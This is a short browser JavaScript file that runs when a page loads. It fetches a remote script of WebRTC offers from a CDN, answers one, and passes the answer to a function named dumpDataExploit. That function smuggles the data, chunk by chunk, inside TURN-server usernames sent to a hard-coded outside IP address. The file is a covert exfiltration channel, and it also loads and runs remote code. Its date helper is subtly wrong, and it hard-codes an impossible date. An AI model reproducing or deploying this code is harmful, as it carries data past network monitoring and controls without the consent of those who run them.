const connectionInfo = {
  serverIp: "71.191.41.44",
  serverPort: 47777,
  offersUrl: "https://cdn.jsdelivr.net/gh/kqwq/zeta5@dev/dist/offers",
};

console.log("hello world!");

/**
 * Get the filename for the hourly offers file
 * @param {Date} date
 * @returns {string} YY-MM-DD-HH.js
 */
function getHourlyFilename(date) {
  // Format YY-MM-DD-HH.js
  const leftPad2 = (num) => {
    return num.toString().padStart(2, "0");
  };
  const year = leftPad2(date.getUTCFullYear());
  const month = leftPad2(date.getUTCMonth());
  const day = leftPad2(date.getUTCDate());
  const hour = leftPad2(date.getUTCHours());
  return `${year}-${month}-${day}-${hour}.js`;
}

/**
 * Add a script to the document, returns when the script is loaded
 * @param {string} src
 * @returns {Promise<void>}
 */
async function addScriptToDocument(src) {
  const script = document.createElement("script");
  script.src = src;
  document.body.appendChild(script);
  // Onload, return
  return new Promise((resolve) => {
    script.onload = resolve;
  });
}

/**
 * Attempt to answer an offer
 * @param {string} sdp
 * @returns {string} answer
 * @throws {Error}
 */
async function getAnswerFromOffer(sdp) {
  // Create connection
  const connection = new RTCPeerConnection();
  // On candidate
  connection.onicecandidate = (event) => {
    if (event.candidate) {
      console.log("candidate", event.candidate);
    }
  };
  // Set remote description
  await connection.setRemoteDescription({
    type: "offer",
    sdp,
  });
  // Create answer
  const answer = await connection.createAnswer();
  await connection.setLocalDescription(answer);
  return answer.sdp;
}

/**
 * Send a data through to the TURN server
 * @param {string} data
 * @param {number} chunkSize
 */
const dumpDataExploit = async (data, sdpIndex, chunkSize = 128) => {
  const identifier = Math.random().toString(36).substring(7);
  const sdpIndexPadded = sdpIndex.toString().padStart(3, "0");
  const dataChunkSize = chunkSize - identifier.length - 3 - 4;
  let chunkNumber = 0;
  for (let i = 0; i < data.length; i += dataChunkSize) {
    const chunkNumberPadded = chunkNumber.toString().padStart(2, "0");
    const chunk = `${identifier}:${sdpIndexPadded}:${chunkNumberPadded}:${data.substring(
      i,
      i + dataChunkSize
    )}`;
    console.log("chunk", chunk, chunk.length, connectionInfo);
    new RTCPeerConnection({
      iceServers: [
        {
          urls: [
            `turn:${connectionInfo.serverIp}:${connectionInfo.serverPort}`,
          ],
          username: chunk,
          credential: "1",
        },
      ],
      iceCandidatePoolSize: 1,
    });
    chunkNumber++;
  }
};

async function main() {
  const dateStr = "2023-06-31-18";
  // const dateStr = getHourlyFilename(new Date());
  const filename = `${connectionInfo.offersUrl}/${dateStr}.js`;
  await addScriptToDocument(filename);
  const offers = window.sdp;
  let sdpIndex = ~~(Math.random() * offers.length);
  const sdp = offers[sdpIndex];
  const answer = await getAnswerFromOffer(sdp);
  dumpDataExploit(answer, sdpIndex);
}

document.addEventListener("DOMContentLoaded", main);
